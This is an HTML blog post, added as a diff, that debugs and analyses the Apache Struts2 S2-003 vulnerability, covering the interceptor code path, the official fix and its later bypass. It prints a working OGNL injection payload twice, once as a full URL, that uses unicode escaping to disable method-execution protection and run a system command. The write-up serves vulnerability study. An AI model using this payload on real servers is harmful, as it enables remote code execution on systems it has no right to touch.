@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="zh-Hans">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>S2-003调试分析 - sn00py</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content=漏洞分析>
+  
+  
+    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.02">
+  
+  
+    <link rel="alternate" href="/atom.xml " title="sn00py" type="application/atom+xml">
+  
+
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">sn00py</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/archives" class="menu-item-link">Archives</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/friends/" class="menu-item-link">Frinds</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">S2-003调试分析</h1>
+  </div>
+   <div class="post-meta">
+    <span class="post-time">2018-04-08</span>
+  </div>
+  <div class="post-content">
+    <h2 id="0x00-代码"><a href="#0x00-代码" class="headerlink" title="0x00 代码"></a>0x00 代码</h2><p>loginAction.java:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.demo.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ognl.Ognl;</span><br><span class="line"><span class="keyword">import</span> ognl.OgnlContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">loginAction</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"error"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>struts.xml:</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"UTF-8"</span><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE struts PUBLIC</span></span><br><span class="line"><span class="meta">        "-//Apache Software Foundation//DTD Struts Configuration 2.0//EN"</span></span><br><span class="line"><span class="meta">        "http://struts.apache.org/dtds/struts-2.0.dtd"&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">struts</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">"S2-003"</span> <span class="attr">extends</span>=<span class="string">"struts-default"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">name</span>=<span class="string">"login"</span> <span class="attr">class</span>=<span class="string">"com.demo.action.loginAction"</span> <span class="attr">method</span>=<span class="string">"execute"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">interceptor-ref</span> <span class="attr">name</span>=<span class="string">"params"</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">result</span> <span class="attr">name</span>=<span class="string">"error"</span>&gt;</span>/index.jsp<span class="tag">&lt;/<span class="name">result</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">struts</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="0x01-POC"><a href="#0x01-POC" class="headerlink" title="0x01 POC"></a>0x01 POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:8080/login.action?&apos;\u0023context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\u003dfalse&apos;(bla)(bla)&amp;&apos;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\&apos;calc\&apos;)&apos;(bla)(bla)</span><br></pre></td></tr></table></figure>
+<h2 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a>0x02 分析</h2><blockquote>
+<p>tomcat7以上传入特殊字符会报错,所以这个漏洞需要在tomcat6下测试.</p>
+</blockquote>
+<p>因为是param拦截器的问题,所以和S2-001一样在com.opensymphony.xwork2.interceptor.ParametersInterceptor下断.</p>
+<p><img src="/2018/04/08/S2-003调试分析/01.jpg" alt=""></p>
+<p>进入setParameters(),到达com.opensymphony.xwork2.interceptor.ParametersInterceptor:170,</p>
+<p><img src="/2018/04/08/S2-003调试分析/02.jpg" alt=""></p>
+<p>先对ParameterNameAware赋值,注意这里为null,所以后面不会进入acceptableParameterName()判断.</p>
+<p><img src="/2018/04/08/S2-003调试分析/03.jpg" alt=""></p>
+<p>接着使用for循环遍历请求传入的参数,这里有4步操作.</p>
+<p>(1)获取参数名;</p>
+<p>(2)判断参数名是否合法</p>
+<p>(3)获取参数名对应的值</p>
+<p>(4)把参数键值对打入值栈</p>
+<p>跟如第2步,看下他是怎么判断合法性的.到达com.opensymphony.xwork2.interceptor.ParametersInterceptor:252,</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">acceptableName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (name.indexOf(<span class="string">'='</span>) != -<span class="number">1</span> || name.indexOf(<span class="string">','</span>) != -<span class="number">1</span> || name.indexOf(<span class="string">'#'</span>) != -<span class="number">1</span></span><br><span class="line">            || name.indexOf(<span class="string">':'</span>) != -<span class="number">1</span> || isExcluded(name)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到,参数名不能有<code>=</code> <code>,</code> <code>#</code> <code>:</code> 这4个符号.</p>
+<p>并且,还要使用isExcluded()方法检测,就在下面就能找到该方法的定义,</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">isExcluded</span><span class="params">(String paramName)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">this</span>.excludeParams.isEmpty()) &#123;</span><br><span class="line">        <span class="keyword">for</span> (Pattern pattern : excludeParams) &#123;</span><br><span class="line">            Matcher matcher = pattern.matcher(paramName);</span><br><span class="line">            <span class="keyword">if</span> (matcher.matches()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>使用正则<code>excludeParams</code>对参数名进行匹配,匹配不上就会返回false,在同文件找到其定义,</p>
+<p><img src="/2018/04/08/S2-003调试分析/04.jpg" alt=""></p>
+<p>为空,所以这里返回false.</p>
+<p>我们先假设参数通过了检测,那么下一步就是获取参数的值,然后调用setParameters()压入值栈.</p>
+<p><img src="/2018/04/08/S2-003调试分析/05.jpg" alt=""></p>
+<p>跟进该方法,到达com.opensymphony.xwork2.util.OgnlValueStack:146,</p>
+<p><img src="/2018/04/08/S2-003调试分析/06.jpg" alt=""></p>
+<p>继续跟进setValue(),到达同文件com.opensymphony.xwork2.util.OgnlValueStack:153,</p>
+<p><img src="/2018/04/08/S2-003调试分析/07.jpg" alt=""></p>
+<p>可以看到expr传入了OgnlUtil.setValue(),作为OGNL表达式执行了.</p>
+<p>所以,至少这里expr我们是可控的.但是不能使用<code>#</code>.</p>
+<p>如果想执行命令,需要把<code>denyMethodExecution</code>设置为false(默认为true),该参数会禁止方法执行,这就需要用到<code>#</code>操作非根对象.</p>
+<p>可以使用unicode编码来绕过,也就是<code>\u0023</code>.</p>
+<p>此处POC的构造利用了<a href="https://commons.apache.org/proper/commons-ognl/language-guide.html" target="_blank" rel="noopener">Expression Evaluation</a>.</p>
+<p><img src="/2018/04/08/S2-003调试分析/08.png" alt=""></p>
+<p>但是为什么要用这种操作我一直没看明白,希望大佬指点.</p>
+<p>所以最终的POC就是:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;\u0023context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\u003dfalse&apos;(bla)(bla)&amp;&apos;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\&apos;calc\&apos;)&apos;(bla)(bla)</span><br></pre></td></tr></table></figure>
+<p>网上很多POC都是针对st2-005的,对于st2-003,其实只要把denyMethodExecution设为false就行了.</p>
+<h2 id="0x03-修复"><a href="#0x03-修复" class="headerlink" title="0x03 修复"></a>0x03 修复</h2><p>官方的修复是使用了白名单机制来过滤参数名(但是他的正则仍然基于黑名单),</p>
+<p><img src="/2018/04/08/S2-003调试分析/09.jpg" alt=""></p>
+<p>然后又加了一个newStack(),</p>
+<p><img src="/2018/04/08/S2-003调试分析/10.jpg" alt=""></p>
+<p>最后还搞出了个沙盒机制,默认禁止了静态方法的调用.</p>
+<p>但是,这一些列操作也还是没防住,unicode编码还是能用,利用OGNL先把沙盒关闭,就又能执行命令了,这就是后面的S2-005了.</p>
+<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>这个洞相比S2-001来说要简单一些,简单来说就是St2把请求中的参数名解析为OGNL表达式执行了,虽然过滤了<code>#</code>,但是可以用unincode绕过.</p>
+<h2 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h2><p><a href="https://cwiki.apache.org/confluence/display/WW/S2-003" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-003</a></p>
+<p><a href="https://commons.apache.org/proper/commons-ognl/language-guide.html" target="_blank" rel="noopener">https://commons.apache.org/proper/commons-ognl/language-guide.html</a></p>
+
+  </div>
+  <div class="post-footer">
+    
+      <ul class="post-tag-list"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/漏洞分析/">漏洞分析</a></li></ul>
+    
+
+    <a href="#top" class="top">Back to Top</a>
+  </div>
+</article>
+<footer>
+  &copy; 2018
+  <span class="author">
+    sn00py
+  </span>
+</footer>
+    </div>
+  </body>
+</html>
